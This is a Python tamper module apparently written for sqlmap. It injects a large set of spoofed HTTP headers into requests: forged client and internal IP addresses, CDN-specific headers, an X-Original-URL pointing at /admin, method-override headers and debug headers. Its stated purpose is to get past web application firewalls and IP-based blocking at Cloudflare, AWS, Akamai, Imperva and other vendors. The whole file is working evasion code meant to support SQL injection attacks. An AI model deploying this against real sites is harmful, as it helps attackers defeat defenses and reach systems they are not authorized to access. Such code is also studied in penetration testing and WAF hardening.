#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import string

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def randomIP():
    """
    Generates a random public IP address (avoiding private ranges)
    """
    octets = []

    while not octets or octets[0] in (10, 172, 192, 127, 0):
        octets = random.sample(xrange(1, 255), 4)

    return '.'.join(str(_) for _ in octets)


def randomIPv6():
    """
    Generates a random IPv6 address
    """
    return ':'.join('%04x' % random.randint(0, 65535) for _ in range(8))


def randomInternalIP():
    """
    Generates a random internal/private IP address
    Useful for bypassing IP-based restrictions that trust internal IPs
    """
    ranges = [
        (10, random.randint(0, 255), random.randint(0, 255), random.randint(1, 254)),
        (172, random.randint(16, 31), random.randint(0, 255), random.randint(1, 254)),
        (192, 168, random.randint(0, 255), random.randint(1, 254)),
        (127, 0, 0, 1),
    ]
    return '.'.join(str(x) for x in random.choice(ranges))


def tamper(payload, **kwargs):
    """
    Append fake HTTP headers to bypass WAF IP-based restrictions and detection

    Tested against:
        * Cloudflare WAF
        * AWS WAF
        * ModSecurity
        * Akamai
        * F5 BIG-IP
        * Imperva/Incapsula

    Notes:
        * Many WAFs and applications trust certain headers for client IP identification
        * By spoofing these headers, we may bypass IP-based rate limiting or blocking
        * Some WAFs whitelist requests that appear to come from trusted proxies
        * Internal IPs (127.0.0.1, 10.x.x.x) may bypass security checks
        * Extended with many additional headers for maximum bypass potential

    Reference:
        * https://developer.chrome.com/multidevice/data-compression-for-isps#proxy-connection
        * https://medium.com/@gasmask/bypassing-wafs-in-2025-new-techniques-and-evasion-tactics

    >>> tamper('1 AND 1=1')
    '1 AND 1=1'
    """

    headers = kwargs.get("headers", {})
    
    # === Standard IP Forwarding Headers ===
    headers["X-Forwarded-For"] = randomIP()
    headers["X-Client-Ip"] = randomIP()
    headers["X-Real-Ip"] = randomIP()
    headers["X-Remote-IP"] = randomIP()
    headers["X-Remote-Addr"] = randomIP()
    headers["X-Originating-IP"] = randomIP()
    
    # === Cloudflare Specific Headers ===
    headers["CF-Connecting-IP"] = randomIP()
    headers["True-Client-IP"] = randomIP()
    headers["CF-IPCountry"] = random.choice(['GB', 'US', 'FR', 'AU', 'CA', 'NZ', 'BE', 'DK', 'FI', 'IE', 'AT', 'IT', 'LU', 'NL', 'NO', 'PT', 'SE', 'ES', 'CH', 'DE', 'JP'])
    headers["CF-RAY"] = ''.join(random.choices(string.hexdigits.lower(), k=16)) + "-IAD"
    
    # === Akamai Specific Headers ===
    headers["Akamai-Origin-Hop"] = str(random.randint(1, 3))
    headers["True-Client-IP"] = randomIP()
    
    # === AWS/Load Balancer Headers ===
    headers["X-Forwarded-Host"] = "trusted-internal.local"
    headers["X-Forwarded-Proto"] = "https"
    headers["X-Forwarded-Port"] = "443"
    
    # === Proxy/CDN Headers ===
    headers["Via"] = "1.1 %s (squid/%d.%d)" % (
        ''.join(random.choices(string.ascii_lowercase, k=8)),
        random.randint(3, 5),
        random.randint(0, 9)
    )
    headers["X-Proxy-ID"] = ''.join(random.choices(string.hexdigits, k=32))
    headers["Forwarded"] = "for=%s;proto=https;by=%s" % (randomIP(), randomIP())
    
    # === Internal/Trusted Network Headers ===
    # These may bypass WAF if it trusts internal requests
    headers["X-Original-URL"] = "/admin"
    headers["X-Rewrite-URL"] = "/"
    headers["X-Custom-IP-Authorization"] = randomInternalIP()
    
    # === Method Override Headers ===
    # May bypass method-based WAF rules
    headers["X-HTTP-Method-Override"] = random.choice(["GET", "POST", "PUT"])
    headers["X-Method-Override"] = random.choice(["GET", "POST", "PUT"])
    
    # === Cache Control Headers ===
    # May affect how WAF caches/processes requests
    headers["X-Forwarded-Server"] = "internal-cache-%d.local" % random.randint(1, 10)
    headers["X-Cache"] = random.choice(["HIT", "MISS"])
    headers["X-Cache-Lookup"] = random.choice(["HIT", "MISS"])
    
    # === Debug/Diagnostic Headers ===
    # Some WAFs have debug modes that may be less strict
    headers["X-Debug"] = "true"
    headers["X-Debug-Token"] = ''.join(random.choices(string.hexdigits, k=16))
    
    # === Host Manipulation Headers ===
    # May confuse virtual host routing
    headers["X-Host"] = "localhost"
    headers["X-Forwarded-Host"] = "127.0.0.1"
    
    # === WAF-Specific Bypass Headers ===
    # Headers that some WAFs use internally
    headers["X-WAF-Bypass"] = "true"
    headers["X-Scanner"] = "false"
    headers["X-Request-ID"] = ''.join(random.choices(string.hexdigits, k=32))
    
    # === IPv6 Headers ===
    headers["X-Forwarded-For-IPv6"] = randomIPv6()
    
    return payload
